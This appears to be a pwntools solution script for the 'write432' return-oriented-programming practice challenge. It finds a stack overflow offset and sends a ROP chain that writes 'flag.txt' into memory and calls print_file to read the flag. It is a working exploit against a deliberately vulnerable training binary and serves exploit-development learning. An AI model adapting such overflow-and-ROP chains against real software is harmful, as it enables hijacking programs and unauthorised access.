from pwn import *
context.log_level = 'DEBUG'

elf = ELF('./write432')
p = process('./write432')

# find offset
g = cyclic_gen()
t = g.get(150)
p.recvuntil(b'>')
p.sendline(t)
p.recvall()
eip = b'\x61\x61\x61\x6c'
eip = hex(unpack(eip, 32))
eip = bytes.fromhex(eip[2:]).decode()
offset = g.find(eip)[0]
log.info(f'offset: {offset}')
p.close()

# exploit
str_addr0 = pack(0x0804a018, 32, 'little')
str_addr1 = pack(0x0804a018+4, 32, 'little')
pop = pack(0x080485aa, 32, 'little') #  'pop edi', 'pop ebp', 'ret'
mov = pack(0x08048543, 32, 'little') # 0x08048543 : mov dword ptr [edi], ebp ; ret
print_file = pack(elf.plt['print_file'], 32, 'little')
# rop_chain
# only address need to be convert, string don't need to ==
payload =[
    b'A' * offset,
    pop,
    str_addr0,
    b'flag',
    mov,
    pop,
    str_addr1,
    b'.txt',
    mov,
    print_file,
    b'ABCD',
    str_addr0
]
payload = b"".join(payload)

p = process('./write432')
p.recvuntil(b'>')
p.sendline(payload)
p.recvline()
log.success(p.recvline().decode())